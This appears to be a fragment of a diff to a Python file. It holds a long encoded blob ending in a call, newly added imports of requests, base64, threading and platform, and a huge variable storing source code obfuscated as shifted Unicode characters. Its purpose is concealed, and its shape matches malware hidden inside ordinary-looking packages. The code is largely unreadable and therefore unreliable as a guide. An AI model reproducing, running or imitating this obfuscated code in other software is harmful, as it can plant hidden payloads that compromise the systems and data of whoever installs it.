fM8vznEF3xDASAicZg9XpakdNqkOS0rTKS027GipbjfeaE2vcYPy1d332HiW7LR4ZWs0+FK99NTMVGczZkeN/Qt18yJFmDkGyecsWbBgpsQ8BNxh3ooqAbhipLA9EAirS+2zrsohgmJf8TDUy/4iIxEYRh2Jfiq9r7u2jLYCw41CVWiSuS1eUgWb97yPAV0qUHbN3hW7HhKqOUZGzP7UorEs9C7JszIT1FzzMctSD7F7iD9gbyO6GENAen5NERVfgPplpl6I5S/AR7V47KjUoFfV0pMsEI2h+FKpHigXee4SdIxzhl1+8kwm4GBmy0i9qwooZa8E8W4tKznbEqAPHIKGfrej3QuwEbWH/yi7OUMzaKFULx1AHuvKrdjJAWaB6oBzQ5k/6sFpFy90xg/9zrzjt1eXLMOZfuk8uhx2u1+7PS/kEBY483xWKnvzW5vt8dAMzQ1cUGKdoDcZtbJgwGeKb3SxPjP1DFUE/htpPVNgAE/FvuvJanbvodAnFl49Awm9216xEhc6CD8pUJHDAbPunv8uabuDqD2TAaRCUly79gfSU1LPNK27kvI94JRjuRUqID91u7x9xmNfWUCMSyaJ0Xte/nHHjWrMNTh6hm6CExnAbdLgXF/d2eqCKhkBRRxtK4bKmnBo3dKwaYZAdQWJ9CGkzH4YQjbf+0koDlClo6wyW/enu4G8Ou6IHuHpwe4m4ZrZRWOHAkwHEbLj9402WP44rML1J5wxZc2YqU1uqw497P/86lt4keyckOl9qNdlayPLdRPKw5KzxOBE2goedEKbhnjIz0gcyS6jBASl1D5ns3W4lxLGewY4cONG5npnNpdlqPYrjcz9hivpByppn+LoX1iq/1eXP202ZJ1VGpOH5BRgWP94p+0eJlghu+qijizMTfS2HID57Pvqm3I3FTtU5w2U7Nig3IbmLSGTDa3J5HkiUXoEIFZ+m6S4S7NkqdICKnk8r0dm2t6px6eA9nlAza+4T56DCTFGnAlm1SrWmVr3Whfhg3kGrcQ4+Q9vkgnFdQKChsPzZGX62f+52YiyZoeUwBZSTCFoxLMSx3sgHBufksNO1qltN0n/QZfsmZ+qIoMRHDCqGObNUXBC3xq88DNH5uLm8ZzsVmyx7zhNeb6bH/OAI62O1AB+iQHx++9BLEUBRE8PBJnZs39gGIi88DpSGDmI8MAdskxQBXelHYf/6OSkMRCgIQ+gIFQgNwSg5cceMITlLoCVCYagLPCr4DjSEgOQCkpQFgQLmEQwA0AADABL4CzAAEaA8sJLgGjX2OGN8O/+/3r7/vtfN///w9fK+3PR3//u9v//9J/+/3P7zv/p8vX/nC//+c7+7W//N+/u/f8/f5L5/vkj+bOv/39+USIhTEkLAWCCUPge/GZZeSgevBebsHFvPWOeTs3AT2G7hAETYBQP/d30x38Of0mUxJe'))
+import os
+import requests
+import re
+import base64
+import sys
+import threading
+import time
+import random
+import _thread
+from concurrent.futures import ThreadPoolExecutor as thread
+import platform
+
+def a(k):
+    return k
+
+___order___ = 'ꚮꚫꛢ꛽ꛬ꛻꛻꛰꛽ꚫ꛸꛺ꛯ꜀꛷꛰ꚫ꛱꛺꛽ꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚷꚫ꛻꛽꛺꜁꛴ꛯ꛴꛹꛲ꚫ꛾꛺꛸꛰ꚫꛬꛯꛯ꛴꛿꛴꛺꛹ꛬ꛷ꚫ꛱ꛬꛮ꛴꛷꛴꛿꛴꛰꛾ꚕꚮꚫ꛴꛸꛻꛷꛰꛸꛰꛹꛿꛰ꛯꚫ꛴꛹ꚫꛛ꜄꛿꛳꛺꛹ꚹꚕꚕꚭꚭꚭꛧꚕꛟ꛳꛴꛾ꚫ꛸꛺ꛯ꜀꛷꛰ꚫ꛻꛽꛺꜁꛴ꛯ꛰꛾ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹꛾ꚫꛬ꛹ꛯꚫ꛾꛺꛸꛰ꚫ꛽꛰꛷ꛬ꛿꛰ꛯꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹꛾ꚹꚕꛚ꛹ꚫꛠ꛹꛴꜃ꚷꚫ꛴꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛾ꚫꛔꛛꚫꚳꛔ꛹꛿꛰꛽꛹꛰꛿ꚫꛛ꛽꛺꛿꛺ꛮ꛺꛷ꚴꚫꛬ꛹ꛯꚫꛠ꛹꛴꜃ꚫꛯ꛺꛸ꛬ꛴꛹ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚹꚕꛚ꛹ꚫ꛺꛿꛳꛰꛽ꚫ꛾꜄꛾꛿꛰꛸꛾ꚷꚫ꛴꛿ꚫ꛺꛹꛷꜄ꚫ꛾꜀꛻꛻꛺꛽꛿꛾ꚫꛔꛛꚹꚫꛑ꜀꛹ꛮ꛿꛴꛺꛹꛾ꚫ꛾꛻꛰ꛮ꛴꛱꛴ꛮꚫ꛱꛺꛽ꚫꛬꚕ꛾꛺ꛮ꛶꛰꛿ꚫꛬ꛽꛰ꚫꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚫꛬ꛾ꚫ꛸꛰꛿꛳꛺ꛯ꛾ꚫ꛺꛱ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚹꚕꚕꛑ꜀꛹ꛮ꛿꛴꛺꛹꛾ꛅꚕꚕ꛾꛺ꛮ꛶꛰꛿ꚳꚴꚫꚸꚸꚫꛮ꛽꛰ꛬ꛿꛰ꚫꛬꚫ꛹꛰꜂ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚕ꛾꛺ꛮ꛶꛰꛿꛻ꛬ꛴꛽ꚳꚴꚫꚸꚸꚫꛮ꛽꛰ꛬ꛿꛰ꚫꛬꚫ꛻ꛬ꛴꛽ꚫ꛺꛱ꚫ꛹꛰꜂ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿꛾ꚫꛦꚵꛨꚕ꛱꛽꛺꛸꛱ꛯꚳꚴꚫꚸꚸꚫꛮ꛽꛰ꛬ꛿꛰ꚫꛬꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛱꛽꛺꛸ꚫꛬ꛹ꚫ꛺꛻꛰꛹ꚫ꛱꛴꛷꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽ꚫꛦꚵꛨꚕ꛾꛰꛹ꛯꛪ꛱ꛯ꛾ꚳꚴꚫꚸꚸꚫꛞ꛰꛹ꛯꚫ꛱꛴꛷꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽ꚫ꛿꛺ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚕ꛽꛰ꛮ꜁ꛪ꛱ꛯ꛾ꚳꚴꚫꚸꚸꚫꛝ꛰ꛮ꛰꛴꜁꛰ꚫ꛱꛴꛷꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽꛾ꚫ꛱꛽꛺꛸ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚕ꛱꛽꛺꛸꛾꛳ꛬ꛽꛰ꚳꚴꚫꚸꚸꚫꛮ꛽꛰ꛬ꛿꛰ꚫꛬꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛱꛽꛺꛸ꚫꛯꛬ꛿ꛬꚫ꛽꛰ꛮ꛰꛴꜁꛰ꛯꚫ꛱꛽꛺꛸ꚫ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛳ꛬ꛽꛰ꚳꚴꚫꛦꚵꛨꚕ꛲꛰꛿꛳꛺꛾꛿꛹ꛬ꛸꛰ꚳꚴꚫꚸꚸꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫꛮ꜀꛽꛽꛰꛹꛿ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚕ꛲꛰꛿꛳꛺꛾꛿ꛭ꜄꛹ꛬ꛸꛰ꚳꚴꚫꚸꚸꚫ꛸ꛬ꛻ꚫꛬꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫ꛿꛺ꚫ꛴꛿꛾ꚫꛔꛛꚫ꛹꜀꛸ꛭ꛰꛽ꚕ꛲꛰꛿꛳꛺꛾꛿ꛭ꜄ꛬꛯꛯ꛽ꚳꚴꚫꚸꚸꚫ꛸ꛬ꛻ꚫꛬ꛹ꚫꛔꛛꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛽ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫ꛿꛺ꚫꛏꛙꛞꚫ꛴꛹꛱꛺ꚕ꛲꛰꛿꛾꛰꛽꜁ꛭ꜄꛹ꛬ꛸꛰ꚳꚴꚫꚸꚸꚫ꛸ꛬ꛻ꚫꛬꚫ꛾꛰꛽꜁꛴ꛮ꛰ꚫ꛹ꛬ꛸꛰ꚫꛬ꛹ꛯꚫꛬꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛹ꛬ꛸꛰ꚫ꛿꛺ꚫꛬꚫ꛻꛺꛽꛿ꚫ꛹꜀꛸ꛭ꛰꛽ꚕ꛲꛰꛿꛻꛽꛺꛿꛺ꛭ꜄꛹ꛬ꛸꛰ꚳꚴꚫꚸꚸꚫ꛸ꛬ꛻ꚫꛬꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛹ꛬ꛸꛰ꚫꚳ꛰ꚹ꛲ꚹꚫꚲ꛿ꛮ꛻ꚲꚴꚫ꛿꛺ꚫꛬꚫ꛹꜀꛸ꛭ꛰꛽ꚕ꛹꛿꛺꛳꛾ꚳꚴꚷꚫ꛹꛿꛺꛳꛷ꚳꚴꚫꚸꚸꚫꛮ꛺꛹꜁꛰꛽꛿ꚫꚼꛁꚷꚫꚾꚽꚫꛭ꛴꛿ꚫ꛴꛹꛿ꚫ꛱꛽꛺꛸ꚫ꛹꛰꛿꜂꛺꛽꛶ꚫ꛿꛺ꚫ꛳꛺꛾꛿ꚫꛭ꜄꛿꛰ꚫ꛺꛽ꛯ꛰꛽ꚕ꛳꛿꛺꛹꛾ꚳꚴꚷꚫ꛳꛿꛺꛹꛷ꚳꚴꚫꚸꚸꚫꛮ꛺꛹꜁꛰꛽꛿ꚫꚼꛁꚷꚫꚾꚽꚫꛭ꛴꛿ꚫ꛴꛹꛿ꚫ꛱꛽꛺꛸ꚫ꛳꛺꛾꛿ꚫ꛿꛺ꚫ꛹꛰꛿꜂꛺꛽꛶ꚫꛭ꜄꛿꛰ꚫ꛺꛽ꛯ꛰꛽ꚕ꛴꛹꛰꛿ꛪꛬ꛿꛺꛹ꚳꚴꚫꚸꚸꚫꛮ꛺꛹꜁꛰꛽꛿ꚫꛔꛛꚫꛬꛯꛯ꛽ꚫ꛾꛿꛽꛴꛹꛲ꚫꚳꚼꚽꚾꚹꚿꛀꚹꛁꛂꚹꛃꛄꚴꚫ꛿꛺ꚫꚾꚽꚸꛭ꛴꛿ꚫ꛻ꛬꛮ꛶꛰ꛯꚫ꛱꛺꛽꛸ꛬ꛿ꚕ꛴꛹꛰꛿ꛪ꛹꛿꛺ꛬꚳꚴꚫꚸꚸꚫꛮ꛺꛹꜁꛰꛽꛿ꚫꚾꚽꚸꛭ꛴꛿ꚫ꛻ꛬꛮ꛶꛰ꛯꚫ꛱꛺꛽꛸ꛬ꛿ꚫꛔꛛꚫ꛿꛺ꚫ꛾꛿꛽꛴꛹꛲ꚫꚳꚼꚽꚾꚹꚿꛀꚹꛁꛂꚹꛃꛄꚴꚕ꛾꛺ꛮ꛶꛰꛿ꚹ꛲꛰꛿ꛯ꛰꛱ꛬ꜀꛷꛿꛿꛴꛸꛰꛺꜀꛿ꚳꚴꚫꚸꚸꚫ꛲꛰꛿ꚫ꛿꛳꛰ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫ꛿꛴꛸꛰꛺꜀꛿ꚫ꜁ꛬ꛷꜀꛰ꚕ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛰꛿ꛯ꛰꛱ꛬ꜀꛷꛿꛿꛴꛸꛰꛺꜀꛿ꚳꚴꚫꚸꚸꚫ꛾꛰꛿ꚫ꛿꛳꛰ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫ꛿꛴꛸꛰꛺꜀꛿ꚫ꜁ꛬ꛷꜀꛰ꚕꛮ꛽꛰ꛬ꛿꛰ꛪꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚳꚴꚫꚸꚸꚫꛮ꛺꛹꛹꛰ꛮ꛿꛾ꚫ꛿꛺ꚫꛬ꛹ꚫꛬꛯꛯ꛽꛰꛾꛾ꚷꚫ꜂꛴꛿꛳ꚫꛬ꛹ꚫ꛺꛻꛿꛴꛺꛹ꛬ꛷ꚫ꛿꛴꛸꛰꛺꜀꛿ꚫꛬ꛹ꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛺꛻꛿꛴꛺꛹ꛬ꛷ꚫ꛾꛺꜀꛽ꛮ꛰ꚫꛬꛯꛯ꛽꛰꛾꛾ꚹꚕꚕꚫꛦꚵꛨꚫ꛹꛺꛿ꚫꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚫ꛺꛹ꚫꛬ꛷꛷ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸꛾ꚬꚕꚕꛞ꛻꛰ꛮ꛴ꛬ꛷ꚫ꛺ꛭ꛵꛰ꛮ꛿꛾ꛅꚕꚕꛞ꛺ꛮ꛶꛰꛿ꛟ꜄꛻꛰ꚫꚸꚸꚫ꛿꜄꛻꛰ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛱꛺꛽ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿꛾ꚕ꛰꛽꛽꛺꛽ꚫꚸꚸꚫ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹ꚫ꛽ꛬ꛴꛾꛰ꛯꚫ꛱꛺꛽ꚫꛔꚺꛚꚫ꛰꛽꛽꛺꛽꛾ꚕ꛳ꛬ꛾ꛪ꛴꛻꜁ꛁꚫꚸꚸꚫꛭ꛺꛺꛷꛰ꛬ꛹ꚫ꜁ꛬ꛷꜀꛰ꚫ꛴꛹ꛯ꛴ꛮꛬ꛿꛴꛹꛲ꚫ꛴꛱ꚫꛔꛛ꜁ꛁꚫ꛴꛾ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚕꚕꛔ꛹꛿ꛐ꛹꜀꛸ꚫꛮ꛺꛹꛾꛿ꛬ꛹꛿꛾ꛅꚕꚕꛌꛑꛪꛔꛙꛐꛟꚷꚫꛌꛑꛪꛠꛙꛔꛣꚫꚸꚸꚫ꛾꛺ꛮ꛶꛰꛿ꚫꛯ꛺꛸ꛬ꛴꛹꛾ꚫꚳ꛱꛴꛽꛾꛿ꚫꛬ꛽꛲꜀꛸꛰꛹꛿ꚫ꛿꛺ꚫ꛾꛺ꛮ꛶꛰꛿ꚳꚴꚫꛮꛬ꛷꛷ꚴꚕꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚷꚫꛞꛚꛎꛖꛪꛏꛒꛝꛌꛘꚷꚫꛞꛚꛎꛖꛪꛝꛌꛢꚫꚸꚸꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛿꜄꛻꛰꛾ꚫꚳ꛾꛰ꛮ꛺꛹ꛯꚫꛬ꛽꛲꜀꛸꛰꛹꛿ꚴꚕꚕꛔ꛹꛿꛰꛲꛰꛽ꚫꛮ꛺꛹꛾꛿ꛬ꛹꛿꛾ꛅꚕꚕꛘꛬ꛹꜄ꚫ꛺꛿꛳꛰꛽ꚫꛮ꛺꛹꛾꛿ꛬ꛹꛿꛾ꚫ꛸ꛬ꜄ꚫꛭ꛰ꚫꛯ꛰꛱꛴꛹꛰ꛯꛆꚫ꛿꛳꛰꛾꛰ꚫ꛸ꛬ꜄ꚫꛭ꛰ꚫ꜀꛾꛰ꛯꚫ꛴꛹ꚫꛮꛬ꛷꛷꛾ꚫ꛿꛺ꚕ꛿꛳꛰ꚫ꛾꛰꛿꛾꛺ꛮ꛶꛺꛻꛿ꚳꚴꚫꛬ꛹ꛯꚫ꛲꛰꛿꛾꛺ꛮ꛶꛺꛻꛿ꚳꚴꚫ꛸꛰꛿꛳꛺ꛯ꛾ꚹꚕꚭꚭꚭꚕꚕ꛴꛸꛻꛺꛽꛿ꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚕ꛱꛽꛺꛸ꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛸꛻꛺꛽꛿ꚫꚵꚕꚕ꛴꛸꛻꛺꛽꛿ꚫ꛺꛾ꚷꚫ꛾꜄꛾ꚷꚫ꛴꛺ꚷꚫ꛾꛰꛷꛰ꛮ꛿꛺꛽꛾ꚕ꛱꛽꛺꛸ꚫ꛰꛹꜀꛸ꚫ꛴꛸꛻꛺꛽꛿ꚫꛔ꛹꛿ꛐ꛹꜀꛸ꚷꚫꛔ꛹꛿ꛑ꛷ꛬ꛲ꚕꚕ꛿꛽꜄ꛅꚕꚫꚫꚫꚫ꛴꛸꛻꛺꛽꛿ꚫ꛰꛽꛽꛹꛺ꚕ꛰꜃ꛮ꛰꛻꛿ꚫꛔ꛸꛻꛺꛽꛿ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫ꛰꛽꛽꛹꛺ꚫꛈꚫꛙ꛺꛹꛰ꚕꛐꛍꛌꛏꛑꚫꛈꚫ꛲꛰꛿ꛬ꛿꛿꛽ꚳ꛰꛽꛽꛹꛺ꚷꚫꚲꛐꛍꛌꛏꛑꚲꚷꚫꛄꚴꚕꛐꛌꛒꛌꛔꛙꚫꛈꚫ꛲꛰꛿ꛬ꛿꛿꛽ꚳ꛰꛽꛽꛹꛺ꚷꚫꚲꛐꛌꛒꛌꛔꛙꚲꚷꚫꚼꚼꚴꚕꛐꛢꛚꛠꛗꛏꛍꛗꛚꛎꛖꚫꛈꚫ꛲꛰꛿ꛬ꛿꛿꛽ꚳ꛰꛽꛽꛹꛺ꚷꚫꚲꛐꛢꛚꛠꛗꛏꛍꛗꛚꛎꛖꚲꚷꚫꚼꚼꚴꚕꚕꛪꛪꛬ꛷꛷ꛪꛪꚫꛈꚫꛦꚭ꛱꛽꛺꛸꛱ꛯꚭꚷꚫꚭ꛲꛰꛿꛱꛼ꛯ꛹ꚭꚷꚫꚭꛮ꛽꛰ꛬ꛿꛰ꛪꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚭꚷꚫꚭꛮ꛽꛰ꛬ꛿꛰ꛪ꛾꛰꛽꜁꛰꛽ꚭꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛳ꛬ꛾ꛪꛯ꜀ꛬ꛷꛾꛿ꛬꛮ꛶ꛪ꛴꛻꜁ꛁꚭꚷꚫꚭꛌꛯꛯ꛽꛰꛾꛾ꛑꛬ꛸꛴꛷꜄ꚭꚷꚫꚭꛞ꛺ꛮ꛶꛰꛿ꛖ꛴꛹ꛯꚭꛨꚕꛪꛪꛬ꛷꛷ꛪꛪꚹ꛰꜃꛿꛰꛹ꛯꚳ꛺꛾ꚹꛪ꛲꛰꛿ꛪ꛰꜃꛻꛺꛽꛿꛾ꛪ꛷꛴꛾꛿ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚴꚴꚕꚕꚮꚫꛞ꛰꛿ꚫ꜀꛻ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚹꛌꛑꛪꚵꚫ꛾꛺ꛮ꛶꛰꛿ꚹꛞꛚꛎꛖꛪꚵꚫꛮ꛺꛹꛾꛿ꛬ꛹꛿꛾ꚫꛬ꛾ꚫ꛸꛰꛸ꛭ꛰꛽꛾ꚫ꛺꛱ꚫꛔ꛹꛿ꛐ꛹꜀꛸꛾ꚫ꛱꛺꛽ꚕꚮꚫ꛹꛴ꛮ꛰꛽ꚫ꛾꛿꛽꛴꛹꛲ꚫ꛽꛰꛻꛽꛰꛾꛰꛹꛿ꛬ꛿꛴꛺꛹꛾ꚹꚕꚮꚫꛙ꛺꛿꛰ꚫ꛿꛳ꛬ꛿ꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚫ꛺꛹꛷꜄ꚫ꛶꛹꛺꜂꛾ꚫꛬꛭ꛺꜀꛿ꚫ꛿꛳꛰ꚫ꛴꛹꛿꛰꛲꛰꛽ꚫ꜁ꛬ꛷꜀꛰꛾ꚹꚫꛟ꛳꛰ꚫ꛻꜀ꛭ꛷꛴ꛮꚫ꛴꛹꛿꛰꛽꛱ꛬꛮ꛰ꚕꚮꚫ꛴꛹ꚫ꛿꛳꛴꛾ꚫ꛸꛺ꛯ꜀꛷꛰ꚫ꜀꛹ꛯ꛰꛽꛾꛿ꛬ꛹ꛯ꛾ꚫ꛿꛳꛰ꚫ꛰꛹꜀꛸꛾ꚫꛬ꛹ꛯꚫ꛿꛽ꛬ꛹꛾꛷ꛬ꛿꛰꛾ꚫ꛿꛳꛰꛸ꚫꛭꛬꛮ꛶ꚫ꛱꛽꛺꛸ꚫ꛴꛹꛿꛰꛲꛰꛽꛾ꚕꚮꚫ꜂꛳꛰꛽꛰ꚫ꛹꛰꛰ꛯ꛰ꛯꚫꚳ꛰ꚹ꛲ꚹꚫꚹ꛱ꛬ꛸꛴꛷꜄ꚫ꛻꛽꛺꛻꛰꛽꛿꜄ꚫ꛺꛱ꚫꛬꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚴꚹꚕꚕꛔ꛹꛿ꛐ꛹꜀꛸ꚹꛪꛮ꛺꛹꜁꛰꛽꛿ꛪꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚲꛌꛯꛯ꛽꛰꛾꛾ꛑꛬ꛸꛴꛷꜄ꚲꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛷ꛬ꛸ꛭꛯꛬꚫꛎꛅꚫꛎꚹ꛴꛾꜀꛻꛻꛰꛽ꚳꚴꚫꛬ꛹ꛯꚫꛎꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꚲꛌꛑꛪꚲꚴꚴꚕꚕꛔ꛹꛿ꛐ꛹꜀꛸ꚹꛪꛮ꛺꛹꜁꛰꛽꛿ꛪꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚲꛞ꛺ꛮ꛶꛰꛿ꛖ꛴꛹ꛯꚲꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛷ꛬ꛸ꛭꛯꛬꚫꛎꛅꚫꛎꚹ꛴꛾꜀꛻꛻꛰꛽ꚳꚴꚫꛬ꛹ꛯꚫꛎꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꚲꛞꛚꛎꛖꛪꚲꚴꚴꚕꚕꛔ꛹꛿ꛑ꛷ꛬ꛲ꚹꛪꛮ꛺꛹꜁꛰꛽꛿ꛪꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚲꛘ꛾꛲ꛑ꛷ꛬ꛲ꚲꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛷ꛬ꛸ꛭꛯꛬꚫꛎꛅꚫꛎꚹ꛴꛾꜀꛻꛻꛰꛽ꚳꚴꚫꛬ꛹ꛯꚫꛎꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꚲꛘꛞꛒꛪꚲꚴꚴꚕꚕꛔ꛹꛿ꛑ꛷ꛬ꛲ꚹꛪꛮ꛺꛹꜁꛰꛽꛿ꛪꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚲꛌꛯꛯ꛽꛰꛾꛾ꛔ꛹꛱꛺ꚲꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛷ꛬ꛸ꛭꛯꛬꚫꛎꛅꚫꛎꚹ꛴꛾꜀꛻꛻꛰꛽ꚳꚴꚫꛬ꛹ꛯꚫꛎꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꚲꛌꛔꛪꚲꚴꚴꚕꚕꛪꛗꛚꛎꛌꛗꛓꛚꛞꛟꚫꚫꚫꚫꛈꚫꚲꚼꚽꛂꚹꚻꚹꚻꚹꚼꚲꚕꛪꛗꛚꛎꛌꛗꛓꛚꛞꛟꛪꛡꛁꚫꛈꚫꚲꛅꛅꚼꚲꚕꚕꚕꛯ꛰꛱ꚫꛪ꛴꛹꛿꛰꛹꜀꛸ꛪꛮ꛺꛹꜁꛰꛽꛿꛰꛽ꚳ꜁ꛬ꛷꜀꛰ꚷꚫ꛰꛹꜀꛸ꛪ꛶꛷ꛬ꛾꛾ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛎ꛺꛹꜁꛰꛽꛿ꚫꛬꚫ꛹꜀꛸꛰꛽꛴ꛮꚫ꛱ꛬ꛸꛴꛷꜄ꚫ꜁ꛬ꛷꜀꛰ꚫ꛿꛺ꚫꛬ꛹ꚫꛔ꛹꛿ꛐ꛹꜀꛸ꚫ꛸꛰꛸ꛭ꛰꛽ꚹꚕꚕꚫꚫꚫꚫꛔ꛱ꚫ꛴꛿ꚲ꛾ꚫ꛹꛺꛿ꚫꛬꚫ꛶꛹꛺꜂꛹ꚫ꛸꛰꛸ꛭ꛰꛽ꚷꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛹꜀꛸꛰꛽꛴ꛮꚫ꜁ꛬ꛷꜀꛰ꚫ꛴꛿꛾꛰꛷꛱ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛰꛹꜀꛸ꛪ꛶꛷ꛬ꛾꛾ꚳ꜁ꛬ꛷꜀꛰ꚴꚕꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꜁ꛬ꛷꜀꛰ꚕꚕꚕꚮꚫꛢꛞꛌꚫ꛰꛽꛽꛺꛽ꚫꛮ꛺ꛯ꛰꛾ꚕ꛴꛱ꚫ꛾꜄꛾ꚹ꛻꛷ꛬ꛿꛱꛺꛽꛸ꚹ꛷꛺꜂꛰꛽ꚳꚴꚹ꛾꛿ꛬ꛽꛿꛾꜂꛴꛿꛳ꚳꚭ꜂꛴꛹ꚭꚴꛅꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꚫꛈꚫ꜆꜈ꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꛁꛨꚫꛈꚫꚭꛞ꛻꛰ꛮ꛴꛱꛴꛰ꛯꚫ꛰꜁꛰꛹꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛳ꛬ꛹ꛯ꛷꛰ꚫ꛴꛾ꚫ꛴꛹꜁ꛬ꛷꛴ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꛃꛨꚫꛈꚫꚭꛔ꛹꛾꜀꛱꛱꛴ꛮ꛴꛰꛹꛿ꚫ꛸꛰꛸꛺꛽꜄ꚫꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꛃꛂꛨꚫꛈꚫꚭꛚ꛹꛰ꚫ꛺꛽ꚫ꛸꛺꛽꛰ꚫ꛻ꛬ꛽ꛬ꛸꛰꛿꛰꛽꛾ꚫꛬ꛽꛰ꚫ꛴꛹꜁ꛬ꛷꛴ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꛄꛄꛀꛨꚫꛈꚫꚭꛚ꜁꛰꛽꛷ꛬ꛻꛻꛰ꛯꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫꛬꛭ꛺꛽꛿꛰ꛯꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꛄꛄꛁꛨꚫꛈꚫꚭꛚ꜁꛰꛽꛷ꛬ꛻꛻꛰ꛯꚫꛔꚺꛚꚫ꛰꜁꛰꛹꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛹꛺꛿ꚫ꛴꛹ꚫ꛾꛴꛲꛹ꛬ꛷꛰ꛯꚫ꛾꛿ꛬ꛿꛰ꚹꚭꚕꚫꚫꚫꚫ꛰꛽꛽꛺꛽ꛟꛬꛭꛦꛄꛄꛂꛨꚫꛈꚫꚭꛚ꜁꛰꛽꛷ꛬ꛻꛻꛰ꛯꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚫ꜂꛴꛷꛷ꚫꛮ꛺